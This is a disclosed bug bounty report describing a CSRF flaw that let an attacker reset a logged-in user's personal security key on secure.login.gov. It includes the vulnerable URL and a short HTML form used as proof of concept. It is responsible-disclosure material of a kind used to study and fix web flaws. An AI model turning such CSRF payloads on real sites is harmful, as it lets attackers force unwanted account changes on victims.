# CSRF to change Account Security Keys on secure.login.gov

## Report Details
- **Report ID**: 263498
- **URL**: https://hackerone.com/reports/263498
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-08-26T02:49:15.371Z
- **Disclosed**: 2017-11-01T19:22:25.330Z

## Reporter
- **Username**: fawazxq
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gsa_bbp

## Vulnerability Information
This may not be in scope and nor be eligible for bounty but I read this in your vulnerability disclosure policy:

*While not all of our services are in scope for our Bug Bounty program, we do welcome disclosures of vulnerabilities through our Vulnerability Disclosure Policy. We would encourage you to review that policy if you have information about a vulnerability in a TTS service not listed below.*

So, I will go ahead and report this, however if you feel I have gone too far or shouldn't test this current sub-domain please inform me so that I can self-close the report as N/A and only focus on the domains, sub-domains and GitHub projects listed on the program page.

**Description**

There exists a CSRF vulnerability which allows an attacker to reset a victims personal security key aka the key which is required to get access back to your account if you ever lose access to your mobile device or forgot your password for your account on secure.login.gov

**POC**

Vulnerable Link : https://secure.login.gov/manage/personal_key?resend=true (Click on it after you are logged in to your account on secure.login.gov)

**CSRF POC**

<html><head>
<title>CSRF POC</title>
</head><body>
<form action="https://secure.login.gov/manage/personal_key?resend=true" method="GET">
<input type='submit' value='Go!' />
</form>
</body></html>

Also, don't hesitate to ask me if you have any further questions or need some clarifications.

Regards
zk34911



## Attachments
No attachments
